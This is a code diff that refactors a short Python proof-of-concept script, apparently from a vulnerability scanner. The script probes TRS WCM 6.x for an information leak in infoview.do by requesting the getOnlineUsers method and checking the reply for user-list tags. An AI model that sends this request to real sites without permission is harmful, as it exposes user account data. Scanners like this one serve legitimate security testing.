@@ -9,20 +9,13 @@ description: 文件infoview.do中导致信息泄露。
 import sys
 import requests
 import warnings
-
-
-
-class wcm_infoview_disclosure:
-    def __init__(self, url):
-        self.url = url
-
-    def run(self):
+def run(url):
         result = ['TRS wcm 6.x版本infoview信息泄露','','']
         headers = {
             "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
         }
         payload = "/wcm/infoview.do?serviceid=wcm6_user&MethodName=getOnlineUsers"
-        vulnurl = self.url + payload
+        vulnurl = url + payload
         try:
             req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
             if r"<USERNAME>" in req.text and r"<Users>" in req.text:
@@ -37,5 +30,4 @@ class wcm_infoview_disclosure:
 
 if __name__ == "__main__":
     warnings.filterwarnings("ignore")
-    testVuln = wcm_infoview_disclosure(sys.argv[1])
-    testVuln.run()
+    testVuln = run(sys.argv[1])
